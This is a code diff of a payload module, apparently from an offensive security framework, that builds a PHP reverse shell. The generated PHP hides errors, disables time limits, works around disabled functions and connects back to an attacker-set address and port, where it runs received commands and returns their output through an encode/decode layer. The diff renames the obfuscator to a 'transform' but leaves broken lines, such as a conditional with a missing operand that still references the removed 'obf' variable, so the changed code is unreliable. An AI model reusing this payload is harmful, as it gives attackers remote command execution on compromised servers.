@@ -20,22 +20,22 @@ class Module(Payload):
 	encoder = OptString("", "Encoder", False, True)
 
 	def generate(self):
-		obf = self._get_obfuscator_instance()
-		obf_code = None
-		if obf and self._is_obfuscator_compatible(obf) and hasattr(obf, "generate_client_code"):
-			obf_code = obf.generate_client_code(self._get_client_language())
-		if obf and not self._is_obfuscator_compatible(obf):
-			supported = getattr(obf, "get_supported_client_languages", lambda: [])()
-			print_warning(f"Obfuscator does not support client language 'php' (supported: {supported}). Generating without obfuscation.")
-		if not obf_code:
-			obf_code = "function _obf_encode($d){return $d;}function _obf_decode($d){return $d;}"
+		xf = self._get_transform_instance()
+		xf_code = None
+		if  and self._is_transform_compatible(obf) and hasattr(obf, "generate_client_code"):
+			xf_code = xf.generate_client_code(self._get_client_language())
+		if  and not self._is_transform_compatible(obf):
+			supported = getattr(xf, "get_supported_client_languages", lambda: [])()
+			print_warning(f"Transform does not support client language 'php' (supported: {supported}). Generating without stream transform.")
+		if not xf_code:
+			xf_code = "function _xf_encode($d){return $d;}function _xf_decode($d){return $d;}"
 
 		php_code = f"""
 @error_reporting(0);
 @set_time_limit(0);
 @ignore_user_abort(1);
 @ini_set('max_execution_time',0);
-{obf_code}
+{xf_code}
 $dis=@ini_get('disable_functions');
 if(!empty($dis)){{
   $dis=preg_replace('/[, ]+/', ',', $dis);
@@ -101,7 +101,7 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
   $s=@fsockopen($ipaddr,$port);
   if($s){{
     while($c=fread($s,2048)){{
-      $c=_obf_decode($c);
+      $c=_xf_decode($c);
       if($c===''){{continue;}}
       $out='';
       if(substr($c,0,3)=='cd '){{
@@ -115,7 +115,7 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
           break;
         }}
       }}
-      $enc=_obf_encode($out);
+      $enc=_xf_encode($out);
       fwrite($s,$enc);
     }}
     fclose($s);
@@ -125,7 +125,7 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
   if($s){{
     @socket_connect($s,$ipaddr,$port);
     while($c=@socket_read($s,2048)){{
-      $c=_obf_decode($c);
+      $c=_xf_decode($c);
       if($c===''){{continue;}}
       $out='';
       if(substr($c,0,3)=='cd '){{
@@ -139,7 +139,7 @@ if(is_callable('fsockopen')and!in_array('fsockopen',$dis)){{
           break;
         }}
       }}
-      $enc=_obf_encode($out);
+      $enc=_xf_encode($out);
       @socket_write($s,$enc,strlen($enc));
     }}
     @socket_close($s);
